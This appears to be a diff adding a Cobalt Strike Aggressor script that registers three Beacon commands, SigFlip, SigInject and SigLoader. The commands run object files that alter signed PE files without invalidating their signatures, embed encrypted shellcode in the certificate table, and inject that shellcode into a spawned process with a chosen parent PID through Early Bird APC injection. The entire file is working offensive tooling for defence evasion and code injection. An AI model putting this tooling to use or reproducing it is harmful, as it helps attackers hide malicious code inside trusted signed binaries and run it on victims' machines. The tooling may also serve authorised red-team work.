@@ -1,0 +1,111 @@
+beacon_command_register(
+"SigFlip", 
+"Change a PE file (DLL, EXE, SYS, OCX ..etc) hash without breaking the signature or the validity of the certificate", 
+"\nUsage: SigFlip <PE_FILE_PATH> <OUTPUT_PE_FILE_PATH (with extension)>\n\nChange a PE file (DLL, EXE, SYS, OCX ..etc) hash without breaking the signature or the validity of the certificate");
+
+beacon_command_register(
+"SigInject", 
+"Encrypts and Injects shellcode into a PE file's [WIN_CERTIFICATE] certificate table, encryption key is printed out for usage with a basic C/C# loader
+. plus keeps the signature and certificate validity intact", 
+"\nUsage: SigInject <PE_FILE_PATH> <OUTPUT_PE_FILE_PATH (with extension)> <ENCRYPTION_KEY> <SHELLCODE_FILE>\n\nEncrypts and Injects shellcode into a PE file's [WIN_CERTIFICATE] certificate table, encryption key is printed out for usage with a basic C/C# loader. plus keeps the signature and certificate validity intact.");
+
+beacon_command_register(
+"SigLoader", "", 
+"\nLoad encrypted shellcode from PE files created by SigInject, then use Early Bird queueuserapc to spawn/inject sc into a sacrificial process\n\nUsage: SigLoader <PE_FILE_PATH_WITH_SH> <DECRYPTION_KEY> <SPAWNTO_PROCESS_PATH> <PARENT_PROCESS_ID>\n\n-> shellcode injection logic can be customized or replaced with any other code injection technique of choice.");
+
+alias SigFlip {
+
+	btask($1, "Sig flipping...");
+	
+    local('$bofHandle $bofData $arguments $PEPath $outPath');
+	
+	$barch  = barch($1);
+	
+	$bofHandle = openf(script_resource("sigflip. $+ $barch $+ .o"));
+	$bofData = readb($bofHandle, -1);
+	closef($bofHandle);
+
+    $PEPath = $2;
+    $outPath = $3;
+
+    if ($PEPath eq "" || $outPath eq "") {
+      berror($1, "Missing arguments, check usage/help\n");
+      return;
+    }
+
+	$arguments = bof_pack($1,"izz",1,$PEPath,$outPath);
+	
+	btask($1, "Sig flipping $2 and saving it to $3");
+	beacon_inline_execute($1, $bofData, "go", $arguments);
+}
+
+alias SigInject {
+
+	btask($1, "Injecting Shellcode...");
+
+
+	local('$bofHandle $bofData $arguments $PEPath $outPath $encKey $scBlob');
+	
+	$barch = barch($1);
+	
+	$bofHandle = openf(script_resource("sigflip. $+ $barch $+ .o"));
+	$bofData = readb($bofHandle, -1);
+	closef($bofHandle);
+
+    $PEPath = $2;
+    $outPath = $3;
+	$encKey = $4;
+
+    if ($PEPath eq "" || $outPath eq "") {
+      berror($1, "Missing arguments, check usage/help\n");
+      return;
+    }
+
+
+	$scHandle = openf($5);
+	$scBlob = readb($scHandle, -1);
+	closef($scHandle);
+
+    if(int(strlen($scBlob)) == 0){
+      berror($1, "Could not read the shellcode file, check the path & if the file exists.\n");
+      return;
+    }
+
+	btask($1, "Encrypting/Injecting Shellcode $5 into $2 ...");
+	btask($1, "Saving result to $3");
+
+	$arguments = bof_pack($1, "izzzb", 0, $PEPath, $outPath, $encKey, $scBlob);
+	
+	beacon_inline_execute($1, $bofData, "go", $arguments);
+}
+
+alias SigLoader {
+
+	btask($1, "Loading Shellcode...");
+
+
+	local('$bofHandle $bofData $arguments $PEPath $encKey $spawntProcess $PPID');
+	
+	$barch = barch($1);
+	
+	$bofHandle = openf(script_resource("sigloader. $+ $barch $+ .o"));
+	$bofData = readb($bofHandle, -1);
+	closef($bofHandle);
+
+    $PEPath = $2;
+    $encKey = $3;
+	$spawntProcess = $4;
+	$PPID = $5;
+
+    if ($PEPath eq "" || $encKey eq "" || $PPID eq "" || $spawntProcess eq "") {
+      berror($1, "Missing arguments, check usage/help\n");
+      return;
+    }
+
+
+	btask($1, "Decrypting/Injecting Shellcode into process with PPID $4 ...");
+
+	$arguments = bof_pack($1, "zzzi", $PEPath, $encKey, $spawntProcess, $PPID);
+	
+	beacon_inline_execute($1, $bofData, "go", $arguments);
+}
